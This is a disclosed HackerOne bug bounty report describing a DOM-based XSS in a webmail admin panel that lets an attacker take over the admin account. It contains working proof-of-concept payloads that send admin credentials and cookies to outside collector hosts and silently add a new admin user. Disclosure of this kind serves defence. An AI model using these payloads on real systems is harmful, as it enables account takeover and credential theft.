---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1619445'
original_report_id: '1619445'
title: Admin account/panel takeOver and Doing actions in admin panel via DOM-based
  XSS
weakness: Cross-site Scripting (XSS) - DOM
team_handle: radancy
created_at: '2022-06-29T17:19:28.642Z'
disclosed_at: '2023-09-12T06:39:39.681Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 63
asset_identifier: '*.maximum.nl'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-dom
---

# Admin account/panel takeOver and Doing actions in admin panel via DOM-based XSS

## Metadata

- HackerOne Report ID: 1619445
- Weakness: Cross-site Scripting (XSS) - DOM
- Program: radancy
- Disclosed At: 2023-09-12T06:39:39.681Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello team ,

I found Dom-XSS in your (https://████████/) Webmail Admin Panel that manage attacker to stealing admin sensitive info  and doing any action in your  webmail admin panel .

## why and how this vulnerability happen :

    - if your reviewed the source code of this endpoint of the admin panel " view-source:https://██████████/admin/" , you can see the vulnerable javascript sink which is document.write :

                ``          
                      if (█████.my█████.isMy█████Instance()) {
		                                    	document.write('<script type="text/javascript" src="' + ███.my████.getGeneratedDefaultsPath() + '"><\/script>');
		                             }
                ``
                     
  you can see that this sink writing data (that including attacker controllable data  which is the value returned of this function `██████.my████.getGeneratedDefaultsPath() `  ) to the DOM without any sanitization or validation  .

- if your reviewed the difination of  this function `██████.my███.getGeneratedDefaultsPath() ` in this js file "https://████/admin/my████.js?v=563fd4e62ed50c2ec5695420aa8c280a"  :

``` █████████.my███████ = {
    urlParams: function() {
        var e, a, r, s, n = document.location.search.substr(1), t = n.split("&"), i = {};
        for (r = 0, s = t.length; s > r; r++) {
            e = t[r].split("=");
            a = e[0];
            i[a] = void 0 === e[1] ? "" : decodeURIComponent(e[1]);
            if (window.JSON && ("jsonHeaders" === a || "uploadHeaders" === a)) {
                i[a] = JSON.parse(i[a]);
            }
        }
        return i;
    }(),
    isMy█████████Instance: function() {
        return !!this.urlParams.appUrl;
    },
    getGeneratedDefaultsPath: function() {
        var e = this.urlParams.appUrl;
        e = e.substr(0, e.indexOf("/api/"));
        return e + "/generatedDefaults.js?v=563fd4e62ed50c2ec5695420aa8c280a&X-InstanceId=" + this.urlParams.jsonHeaders["X-InstanceId"];
    }
};
```
you can that the query string parameters is parssed via `urlParams` function and this paramters values then used in `getGeneratedDefaultsPath` function to generate the return value  by taking the value of `appUrl` parameters and passed it with the returned value , and as you can see there is no attacker controllable data sanitization or filtration , which enable attacker to pass malicious code via `appUrl` parameter to  the DOM sink (`document.write`) which manuplate the DOM and excute any code in the admin panel .


##POC :


1) in case the admin not logged in yet , attacker can  stealing the admin credentials , here steps to reproduce  :

1 - change the value of `attackerServer` variable in the code below to your server .
2 - just open this link  : 
       https://██████████/admin/?appUrl=x%22%3E%3C/script%3E%3Cscript%3Ealert(document.domain);window.onload%3D()%3D%3E{document.getElementById(%22myframe%22).contentDocument.getElementById(%22login-button%22).onclick%3D()%3D%3E{let%20attackerServer%3D"https://dizw1b5gzqe6kw4f93zwtiez0q6hu6.oastify.com";new%20Image().src%3D`${attackerServer}?AdminUsernameIS:${document.getElementById(%22myframe%22).contentDocument.getElementById(%27username%27).value}%26%26AdminPasswordIS:${document.getElementById(%22myframe%22).contentDocument.getElementById(%27password%27).value}`;}}%3C/script%3E%3Ciframe%20id%3D%22myframe%22%20src%3Dhttps://████/admin/login/%20style%3D%22position%3Afixed%3B%20top%3A0%3B%20left%3A0%3B%20bottom%3A0%3B%20right%3A0%3B%20width%3A100%25%3B%20height%3A100%25%3B%20border%3Anone%3B%20margin%3A0%3B%20padding%3A0%3B%20overflow%3Ahidden%3B%20z-index%3A999999%3B%22%3E//api/&jsonHeaders={%22hf%22:%22uwt%22}

as you can see the xss alert is poped up , and when entering admin credintials and submiting it , this credentials will route to attacker server ( see the attachment video )

2) in case the admin already logged in , attacker can steal the admin auth-token and doing any action in the admin panel , like adding new AdminUser , change admin password ,reading/sending mails ,....etc .
 and here the POC and steps to reproduce stealing admin auth-token and adding new AdminUser :

         1 - first of all as i didn't have admin account in your panel , so  i was installed the ███ software that you are use to show you suitable POC .
         2- now put this js code in external file in your server : 
                                        ``` 
                                             window.onload = () => {

    let frame1 = document.createElement("iframe");
    frame1.src = "http://127.0.0.1:4040/admin/#users";


    let frame2 = document.createElement("iframe");
    frame2.src = "http://127.0.0.1:4040/admin/#users";
    frame2.setAttribute("style", "position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;")


    document.body.appendChild(frame1);
    document.body.appendChild(frame2);


    function addNewAdmin() {


        setTimeout(() => {
            k_webAssist.k_showIframe = () => {
                let prevertEROR = "no worries"
            }
            frame1.contentDocument.getElementById('users_k_bottomToolbar_k_btnAdd').click();
        }, 3000)



        setTimeout(() => {

            frame1.contentDocument.getElementById('userEditorAdd_k_formGeneral_loginName').value = 'NewUserNameFromAttacker';
            frame1.contentDocument.getElementById('userEditorAdd_k_formGeneral_password').value = 'Admin123123';
            frame1.contentDocument.getElementById('userEditorAdd_k_formGeneral_passwordConfirmation').value = 'Admin123123';

            frame1.contentDocument.getElementById('userEditorAdd_k_tb_k_btnOk').click();
        }, 5000)

        return true;

    }

    function sendAuthTokenToAttacker() {
        let attackerServer = 'https://kh5zh0fcso7usao2eu9fhu74wv2rqg.oastify.com';
        let script=document.createElement('script');
        script.src=attackerServer +"?here the Auth-token:"+JSON.stringify(document.cookie);
        document.body.appendChild(script);
    }


    frame1.onload = () => {
        if(addNewAdmin()==true)
        sendAuthTokenToAttacker();
    }

}
              
```

##Note: please don't forget to change `attackerServer ` to your which you want to route the `Auth-token` to it.

3- now just edit the below link with `yourServer` and open it : 
http://127.0.0.1:4040/admin/?appUrl=%22%3E%3C/script%3E%3Cscript%20src%3Dhttps://yourServer.com/myScript.js%3E%3C/script%3E//api/&jsonHeaders={%22hf%22:%22uwt%22}
4- wait a little then the `auth-token` will route to attackerServer , and new AdminUser will added without any admin interaction!

##End:
-I hope the vulnerability and Impact/exploit it's clear to you now because I spent a lot of time to build this report as clear as :)

- Best regards!

## Impact

- by executing JavaScript code in the admin browser , attacker can do any action in the admin panel without admin interaction and even takeOver the admin account/panel .

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
